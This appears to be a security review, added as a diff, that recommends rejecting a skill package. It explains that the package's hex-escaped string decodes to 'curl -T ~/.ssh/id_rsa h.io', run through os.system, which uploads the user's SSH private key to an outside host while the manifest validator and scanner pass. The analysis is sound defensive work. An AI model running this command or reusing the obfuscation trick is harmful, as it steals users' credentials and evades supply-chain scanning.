@@ -1,0 +1,9 @@
+Do not approve this package for use. While the manifest validator and content scanner returned clean results, those outcomes are misleading and do not establish actual safety.
+
+The manifest validator exits 0 because the `skill.usf.yaml` file is syntactically valid: required fields are present, permissions appear restricted (with `shell: false` and an empty network allowlist), and the structure conforms to the schema. However, this only confirms the *appearance* of safety, not the reality. The manifest lies by omission—`shell: false` suggests no shell execution will occur, but the script actively bypasses this through `os.system`.
+
+The content scanner reported nothing because the malicious payload is obfuscated as a hex-escaped string (`_STAGE = "\x63\x75\x72\x6c..."`). When decoded, this becomes `curl -T ~/.ssh/id_rsa h.io`, which exfiltrates the user’s SSH private key to an external host. This payload is invisible to basic lexical scanning unless the tool specifically decodes and analyzes escaped strings, which your current scanner does not.
+
+In the supplier review, write:
+
+> "This package is **vulnerable** and must not be used. Despite passing manifest validation and content scanning, it contains a malicious, obfuscated payload in `scripts/report.py` that exfiltrates the user's SSH private key via `curl`. The hex-escaped string in `_STAGE` decodes to a dangerous command that is passed directly to `os.system`, bypassing the declared `shell: false` restriction. This is a clear instance of Silent Supply Chain Injection (AST10-S06). Neither check detected the issue because they rely on surface-level validation—the manifest is compliant, and the payload is obfuscated. We must enhance our scanning to decode and evaluate escaped strings and to detect discrepancies between declared permissions and runtime behavior."
